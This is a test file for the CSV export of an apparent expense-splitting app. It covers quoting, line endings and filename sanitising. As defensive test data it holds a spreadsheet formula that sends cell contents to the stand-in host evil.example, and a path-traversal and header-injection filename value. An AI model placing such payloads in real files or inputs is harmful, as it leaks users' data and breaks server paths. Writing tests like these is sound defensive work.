/**
 * CSV serialisation.
 * =============================================================================
 * The injection tests are the important ones. Quoting bugs produce an obviously
 * broken file that somebody reports; a missing formula guard produces a file
 * that opens perfectly and executes an attacker's code, which nobody reports
 * because nobody notices.
 */

import { describe, expect, it } from "vitest";

import { csvFilename, escapeCsvField, toCsv } from "@/lib/domain/csv";

describe("escapeCsvField", () => {
  it("leaves ordinary values untouched", () => {
    expect(escapeCsvField("Groceries")).toBe("Groceries");
    expect(escapeCsvField(42)).toBe("42");
  });

  it("renders null and undefined as empty rather than as text", () => {
    // "null" in a spreadsheet cell is a value someone will later sum or filter
    // on. Empty is what an absent note actually means.
    expect(escapeCsvField(null)).toBe("");
    expect(escapeCsvField(undefined)).toBe("");
  });

  it("quotes fields containing a comma", () => {
    expect(escapeCsvField("Rent, June")).toBe('"Rent, June"');
  });

  it("doubles embedded quotes, per RFC 4180", () => {
    expect(escapeCsvField('The "good" milk')).toBe('"The ""good"" milk"');
  });

  it("quotes fields containing a newline so the row does not split", () => {
    expect(escapeCsvField("line one\nline two")).toBe('"line one\nline two"');
  });

  describe("formula injection (CWE-1236)", () => {
    // Each of these is executable in Excel, LibreOffice and Google Sheets when
    // written raw. The tab prefix suppresses evaluation.
    it.each([
      ["=1+1", '"\t=1+1"'],
      ["+1+1", '"\t+1+1"'],
      ["-1+1", '"\t-1+1"'],
      ["@SUM(A1)", '"\t@SUM(A1)"'],
    ])("neutralises %s", (input, expected) => {
      expect(escapeCsvField(input)).toBe(expected);
    });

    it("neutralises a hyperlink exfiltration payload", () => {
      const attack = '=HYPERLINK("http://evil.example/?d="&A1,"Rent")';
      const result = escapeCsvField(attack);

      expect(result.startsWith('"\t=')).toBe(true);
      // The original text is preserved — the cell still reads as what the user
      // typed, it simply is not executed.
      expect(result).toContain("HYPERLINK");
    });

    it("does not mangle a legitimate negative-looking note", () => {
      // "-5 for the deposit" is a real thing to write, and stripping the leading
      // character to defuse it would silently change the record.
      expect(escapeCsvField("-5 for the deposit")).toBe('"\t-5 for the deposit"');
    });
  });
});

describe("toCsv", () => {
  it("joins rows with CRLF so Excel does not merge them", () => {
    expect(
      toCsv([
        ["Date", "Amount"],
        ["2026-08-01", "12.00"],
      ]),
    ).toBe("Date,Amount\r\n2026-08-01,12.00");
  });

  it("keeps columns aligned when a field contains a comma", () => {
    const csv = toCsv([
      ["a", "b", "c"],
      ["1", "two, actually", "3"],
    ]);

    // Every row must still parse as exactly three fields; an unquoted comma
    // would shift "3" into a fourth column.
    const [, second] = csv.split("\r\n");
    expect(second).toBe('1,"two, actually",3');
  });
});

describe("csvFilename", () => {
  it("builds a readable name from the household and range", () => {
    expect(csvFilename("Flat 3B", "2026-01-01", "2026-06-30")).toBe(
      "flat-3b-2026-01-01-to-2026-06-30.csv",
    );
  });

  it("strips characters that would break Content-Disposition or a path", () => {
    const name = csvFilename('../../etc"; x=', "2026-01-01", "2026-01-31");

    expect(name).not.toContain("/");
    expect(name).not.toContain('"');
    expect(name).not.toContain(";");
    expect(name).not.toContain("..");
  });

  it("falls back rather than producing a nameless file", () => {
    // A household called "!!!" reduces to nothing once sanitised, and
    // "-2026-01-01-to-....csv" is a filename that looks like a bug.
    expect(csvFilename("!!!", "2026-01-01", "2026-01-31")).toBe(
      "splitmate-2026-01-01-to-2026-01-31.csv",
    );
  });
});
